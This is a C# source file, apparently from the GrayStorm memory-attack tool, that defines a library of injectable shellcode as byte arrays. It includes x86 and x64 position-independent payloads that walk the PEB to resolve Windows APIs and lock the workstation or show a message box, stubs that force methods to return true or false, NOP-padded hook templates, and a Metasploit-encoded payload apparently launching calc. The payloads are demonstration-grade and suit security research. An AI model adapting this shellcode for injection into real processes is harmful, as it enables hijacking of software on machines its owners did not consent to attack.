﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace GrayStorm.shellcodes
{
    class payloads
    {
        #region init
        public static System.Collections.Generic.List<dataBox> payloadsList()
        {
            System.Collections.Generic.List<dataBox> payloads = new List<dataBox>();
            if (IntPtr.Size == 4)
            {
                payloads.Add(new dataBox("returnTrue", returnTrue, 0));
                payloads.Add(new dataBox("returnFalse", returnFalse, 0));
                payloads.Add(new dataBox("lockWorkSation", lockWorkSation, 0));
                payloads.Add(new dataBox("testingShellcodeFire", testingShellcodeFire, 21));
            }
            else
            {
                payloads.Add(new dataBox("message box 64bit Topher", test64BitMessageBox, 0));
                payloads.Add(new dataBox("test dat hook", SixtyFourbitHookTest, 148));
                 payloads.Add(new dataBox("Return True", returnTrue64, 0));
                 payloads.Add(new dataBox("Return False", returnFalse64, 0));
            }
            return payloads;
        }

        public static System.Collections.Generic.List<dataBox> metaSploitList()
        {
            System.Collections.Generic.List<dataBox> payloads = new List<dataBox>();
            if (IntPtr.Size == 4)
            {
                payloads.Add(new dataBox("msfCALC", msfCALC, 0));
            }
            else
            {
                payloads.Add(new dataBox("64bit Test MSF", test64Bit, 0));
            }
            return payloads;
        }

        #endregion init

        #region x86
        static public byte[] returnTrue = new byte[]
        {
               
                  0x31, 0xc0,       //xor eax, eax &
                  0x40,             //inc eax
                  0xc3  //ret

        };

        static public byte[] returnFalse = new byte[]
        {
               
                  0x60,              //popad
                  0x31, 0xc0,       //xor eax, eax &
                  0x89, 0x44, 0x24, //mov eax X
                  0x1c, 
                  0x61, //pushad
                  0xc3  //ret

        };

        static public byte[] lockWorkSation = new byte[]
        {
           
            0xe8, 0x0b, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e,
            0x64, 0x6c, 0x6c, 0x00, 0x5b, 0x60, 0x89, 0xe5, 0x83, 0xec, 0x08, 0x64,
            0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c, 0x8b, 0x40, 0x14, 
            0x8b,  0x00, 0x8b, 0x00, 0x8b, 0x00, 0x8b, 0x40, //walk the PEB and get 4th entry for kernel32 base address! 
            0x10, 0x89, 0x45, 0xfc, 0x50, 0x56, 0x68,
            0x8e, 0x4e, 0x0e, 0xec, 0xff, 0x75, 0xfc, 0xe8, 0x33, 0x00, 0x00, 0x00,
            0x53, 0xff, 0xd0, 0x89, 0x45, 0xf8, 0x5e, 0x58, 0xe8, 0x00, 0x00, 0x00,
            0x00, 0x68, 0x8f, 0xe6, 0x24, 0x57, 0xff, 0x75, 0xf8, 0xe8, 0x19, 0x00,
            0x00, 0x00, 0xff, 0xd0, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x68, 0x7e, 0xd8,
            0xe2, 0x73, 0xff, 0x75, 0xfc, 0xe8, 0x05, 0x00, 0x00, 0x00, 0x31, 0xf6,
            0x56, 0xff, 0xd0, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45, 0x3c, 0x8b,
            0x54, 0x05, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a, 0x20, 0x01,
            0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31,
            0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
            0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01,
            0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb, 0x8b, 0x04,
            0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3
        };



        static public byte[] call_a_fun_ptr = new byte[]
        {          
            0x60, //pushad
            0x8b, 0x44, 0x24, 0x24,  //mov eax, [esp - 0x24]
            0xff, 0xd0, //call eax
            0x61, //popad
            0xc3//ret
        };


        //21 bytes from bottom there is room for the hook before the last ret... 
        static public byte[] testingShellcodeFire = new byte[]
        {
            0x55, 0x89, 0xe5, 0x89, 0xe7, 0x68, 0x6c, 0x6c, 0x00, 0x00, 0x68, 0x33,
            0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x89, 0xe3, 0x89, 0xe5,
            0x83, 0xec, 0x40, 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c,
            0x8b, 0x70, 0x14, 0x8b, 0x16, 0x8b, 0x12, 0x8b, 0x12, 0xad, 0x8b, 0x52,
            0x10, 0x89, 0x55, 0xfc, 0x50, 0x56, 0x68, 0x8e, 0x4e, 0x0e, 0xec, 0xff,
            0x75, 0xfc, 0xe8, 0x53, 0x00, 0x00, 0x00, 0x53, 0xff, 0xd0, 0x89, 0x45,
            0xf8, 0x5e, 0x58, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x68, 0xa8, 0xa2, 0x4d,
            0xbc, 0xff, 0x75, 0xf8, 0xe8, 0x39, 0x00, 0x00, 0x00, 0x68, 0x6f, 0x78,
            0x20, 0x00, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65, 0x73, 0x73,
            0x68, 0x65, 0x72, 0x73, 0x20, 0x68, 0x54, 0x6f, 0x70, 0x68, 0x89, 0xe3,
            0x68, 0x73, 0x74, 0x20, 0x00, 0x68, 0x79, 0x20, 0x74, 0x65, 0x68, 0x53,
            0x69, 0x6c, 0x6c, 0x89, 0xe1, 0x6a, 0x00, 0x53, 0x51, 0x6a, 0x00, 0xff,
            0xd0, 0x83, 0xc4, 0x40, 0xeb, 0x4e, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b,
            0x45, 0x3c, 0x8b, 0x54, 0x05, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b,
            0x5a, 0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee,
            0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf,
            0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b,
            0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01,
            0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            0x89, 0xfc, 0x5d, 0x58, 0x83, 0xe8, 0x07, 0x50, 0xc3
        };


        static public byte[] msfCALC = new byte[]
        {
            0xd9, 0xe9, 0xd9, 0x74, 0x24, 0xf4, 0xbb, 0x0b, 0xc7, 0x22, 0xd6, 0x5e, 0x33, 0xc9, 0xb1, 
            0x33, 0x31, 0x5e, 0x17, 0x03, 0x5e, 0x17, 0x83, 0xcd, 0xc3, 0xc0, 0x23, 0x2d, 0x23, 0x8d, 
            0xcc, 0xcd, 0xb4, 0xee, 0x45, 0x28, 0x85, 0x3c, 0x31, 0x39, 0xb4, 0xf0, 0x31, 0x6f, 0x35, 
            0x7a, 0x17, 0x9b, 0xce, 0x0e, 0xb0, 0xac, 0x67, 0xa4, 0xe6, 0x83, 0x78, 0x08, 0x27, 0x4f, 
            0xba, 0x0a, 0xdb, 0x8d, 0xef, 0xec, 0xe2, 0x5e, 0xe2, 0xed, 0x23, 0x82, 0x0d, 0xbf, 0xfc, 
            0xc9, 0xbc, 0x50, 0x88, 0x8f, 0x7c, 0x50, 0x5e, 0x84, 0x3d, 0x2a, 0xdb, 0x5a, 0xc9, 0x80, 
            0xe2, 0x8a, 0x62, 0x9e, 0xad, 0x32, 0x08, 0xf8, 0x0d, 0x43, 0xdd, 0x1a, 0x71, 0x0a, 0x6a, 
            0xe8, 0x01, 0x8d, 0xba, 0x20, 0xe9, 0xbc, 0x82, 0xef, 0xd4, 0x71, 0x0f, 0xf1, 0x11, 0xb5, 
            0xf0, 0x84, 0x69, 0xc6, 0x8d, 0x9e, 0xa9, 0xb5, 0x49, 0x2a, 0x2c, 0x1d, 0x19, 0x8c, 0x94, 
            0x9c, 0xce, 0x4b, 0x5e, 0x92, 0xbb, 0x18, 0x38, 0xb6, 0x3a, 0xcc, 0x32, 0xc2, 0xb7, 0xf3, 
            0x94, 0x43, 0x83, 0xd7, 0x30, 0x08, 0x57, 0x79, 0x60, 0xf4, 0x36, 0x86, 0x72, 0x50, 0xe6, 
            0x22, 0xf8, 0x72, 0xf3, 0x55, 0xa3, 0x18, 0x02, 0xd7, 0xd9, 0x65, 0x04, 0xe7, 0xe1, 0xc5, 
            0x6d, 0xd6, 0x6a, 0x8a, 0xea, 0xe7, 0xb8, 0xef, 0x05, 0xa2, 0xe1, 0x59, 0x8e, 0x6b, 0x70, 
            0xd8, 0xd3, 0x8b, 0xae, 0x1e, 0xea, 0x0f, 0x5b, 0xde, 0x09, 0x0f, 0x2e, 0xdb, 0x56, 0x97, 
            0xc2, 0x91, 0xc7, 0x72, 0xe5, 0x06, 0xe7, 0x56, 0x86, 0xc9, 0x7b, 0x3a, 0x67, 0x6c, 0xfc, 
            0xd9, 0x77

        };

        #endregion x86

        #region x64

        static public byte[] test64Bit = new byte[] 
        {
            0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x65, 0x4c, 0x8b, 0x24,
            0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x64, 0x24, 0x18, 0x4d, 0x8b,
            0x64, 0x24, 0x20, 0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x7c, 0x24, 0x20,
            0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x64, 0x24, 0x20, 0xba, 0x8e, 0x4e,
            0x0e, 0xec, 0x4c, 0x89, 0xe1, 0xe8, 0x68, 0x00, 0x00, 0x00, 0xeb, 0x34,
            0x59, 0xff, 0xd0, 0xba, 0xa8, 0xa2, 0x4d, 0xbc, 0x48, 0x89, 0xc1, 0xe8,
            0x56, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x4d, 0x31, 0xc9, 0xeb, 0x2c,
            0x41, 0x58, 0xeb, 0x3a, 0x5a, 0x48, 0x31, 0xc9, 0xff, 0xd3, 0xba, 0x70,
            0xcd, 0x3f, 0x2d, 0x4c, 0x89, 0xf9, 0xe8, 0x37, 0x00, 0x00, 0x00, 0x48,
            0x31, 0xc9, 0xff, 0xd0, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x75, 0x73, 0x65,
            0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0xe8, 0xcf, 0xff, 0xff,
            0xff, 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x66, 0x75, 0x6e,
            0x21, 0x00, 0xe8, 0xc1, 0xff, 0xff, 0xff, 0x30, 0x78, 0x64, 0x65, 0x61,
            0x64, 0x62, 0x65, 0x65, 0x66, 0x00, 0x49, 0x89, 0xcd, 0x67, 0x41, 0x8b,
            0x45, 0x3c, 0x67, 0x45, 0x8b, 0xb4, 0x05, 0x88, 0x00, 0x00, 0x00, 0x45,
            0x01, 0xee, 0x67, 0x45, 0x8b, 0x56, 0x18, 0x67, 0x41, 0x8b, 0x5e, 0x20,
            0x44, 0x01, 0xeb, 0x67, 0xe3, 0x3f, 0x41, 0xff, 0xca, 0x67, 0x42, 0x8b,
            0x34, 0x93, 0x44, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84,
            0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x39, 0xd7,
            0x75, 0xdd, 0x67, 0x41, 0x8b, 0x5e, 0x24, 0x44, 0x01, 0xeb, 0x31, 0xc9,
            0x66, 0x67, 0x42, 0x8b, 0x0c, 0x53, 0x67, 0x41, 0x8b, 0x5e, 0x1c, 0x44,
            0x01, 0xeb, 0x67, 0x8b, 0x04, 0x8b, 0x44, 0x01, 0xe8, 0xc3
    };

        static public byte[] test64BitMessageBox = new byte[]
        {
            0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x65, 0x4c, 0x8b, 0x24,
            0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x64, 0x24, 0x18, 0x4d, 0x8b,
            0x64, 0x24, 0x20, 0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x7c, 0x24, 0x20,
            0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x64, 0x24,
            0x20, 0xba, 0x8e, 0x4e, 0x0e, 0xec, 0x4c, 0x89, 0xe1, 0xe8, 0x68, 0x00,
            0x00, 0x00, 0xeb, 0x34, 0x59, 0xff, 0xd0, 0xba, 0xa8, 0xa2, 0x4d, 0xbc,
            0x48, 0x89, 0xc1, 0xe8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x4d,
            0x31, 0xc9, 0xeb, 0x2c, 0x41, 0x58, 0xeb, 0x3a, 0x5a, 0x48, 0x31, 0xc9,
            0xff, 0xd3, 0xba, 0x70, 0xcd, 0x3f, 0x2d, 0x4c, 0x89, 0xf9, 0xe8, 0x37,
            0x00, 0x00, 0x00, 0x48, 0x31, 0xc9, 0xff, 0xd0, 0xe8, 0xc7, 0xff, 0xff,
            0xff, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00,
            0xe8, 0xcf, 0xff, 0xff, 0xff, 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73,
            0x20, 0x66, 0x75, 0x6e, 0x21, 0x00, 0xe8, 0xc1, 0xff, 0xff, 0xff, 0x30,
            0x78, 0x64, 0x65, 0x61, 0x64, 0x62, 0x65, 0x65, 0x66, 0x00, 0x49, 0x89,
            0xcd, 0x67, 0x41, 0x8b, 0x45, 0x3c, 0x67, 0x45, 0x8b, 0xb4, 0x05, 0x88,
            0x00, 0x00, 0x00, 0x45, 0x01, 0xee, 0x67, 0x45, 0x8b, 0x56, 0x18, 0x67,
            0x41, 0x8b, 0x5e, 0x20, 0x44, 0x01, 0xeb, 0x67, 0xe3, 0x3f, 0x41, 0xff,
            0xca, 0x67, 0x42, 0x8b, 0x34, 0x93, 0x44, 0x01, 0xee, 0x31, 0xff, 0x31,
            0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
            0xeb, 0xf4, 0x39, 0xd7, 0x75, 0xdd, 0x67, 0x41, 0x8b, 0x5e, 0x24, 0x44,
            0x01, 0xeb, 0x31, 0xc9, 0x66, 0x67, 0x42, 0x8b, 0x0c, 0x53, 0x67, 0x41,
            0x8b, 0x5e, 0x1c, 0x44, 0x01, 0xeb, 0x67, 0x8b, 0x04, 0x8b, 0x44, 0x01,
            0xe8, 0xc3
        };

        static public byte[] returnTrue64 = new byte[]
        {
             0x48, 0x31, 0xc0,       //xor rax, rax
             0x48, 0x83, 0xc0, 0x01, //add rax, 1
             0xc3                    //ret
        };

        static public byte[] returnFalse64 = new byte[]
        {
              0x48, 0x31, 0xc0, //xor rax, rax
              0xc3              //ret
        };

        static public byte[] SixtyFourbitHookTest = new byte[]
        {
            0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x65, 0x4c
            , 0x8b, 0x24,
            0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x64, 0x24, 0x18
            , 0x4d, 0x8b,
            0x64, 0x24, 0x20, 0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x7c
            , 0x24, 0x20,
            0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x64, 0x24, 0x20, 0xba
            , 0x8e, 0x4e,
            0x0e, 0xec, 0x4c, 0x89, 0xe1, 0xe8, 0x6c, 0x00, 0x00, 0x00
            , 0xeb, 0x38,
            0x59, 0xff, 0xd0, 0xba, 0xa8, 0xa2, 0x4d, 0xbc, 0x48, 0x89
            , 0xc1, 0xe8,
            0x5a, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x4d, 0x31, 0xc9
            , 0xeb, 0x42,
            0x41, 0x58, 0xeb, 0x2c, 0x5a, 0x48, 0x31, 0xc9, 0xff, 0xd3
            , 0x90, 0x90,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
            , 0x90, 0x90,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xc3, 0xe8, 0xc3
            , 0xff, 0xff,
            0xff, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c
            , 0x6c, 0x00,
            0xe8, 0xcf, 0xff, 0xff, 0xff, 0x54, 0x68, 0x69, 0x73, 0x20
            , 0x69, 0x73,
            0x20, 0x66, 0x75, 0x6e, 0x21, 0x00, 0xe8, 0xb9, 0xff, 0xff
            , 0xff, 0x30,
            0x78, 0x64, 0x65, 0x61, 0x64, 0x62, 0x65, 0x65, 0x66, 0x00
            , 0x49, 0x89,
            0xcd, 0x67, 0x41, 0x8b, 0x45, 0x3c, 0x67, 0x45, 0x8b, 0xb4
            , 0x05, 0x88,
            0x00, 0x00, 0x00, 0x45, 0x01, 0xee, 0x67, 0x45, 0x8b, 0x56
            , 0x18, 0x67,
            0x41, 0x8b, 0x5e, 0x20, 0x44, 0x01, 0xeb, 0x67, 0xe3, 0x3f
            , 0x41, 0xff,
            0xca, 0x67, 0x42, 0x8b, 0x34, 0x93, 0x44, 0x01, 0xee, 0x31
            , 0xff, 0x31,
            0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d
            , 0x01, 0xc7,
            0xeb, 0xf4, 0x39, 0xd7, 0x75, 0xdd, 0x67, 0x41, 0x8b, 0x5e
            , 0x24, 0x44,
            0x01, 0xeb, 0x31, 0xc9, 0x66, 0x67, 0x42, 0x8b, 0x0c, 0x53
            , 0x67, 0x41,
            0x8b, 0x5e, 0x1c, 0x44, 0x01, 0xeb, 0x67, 0x8b, 0x04, 0x8b
            , 0x44, 0x01,
            0xe8, 0xc3
    };

        #endregion x64
    }
}

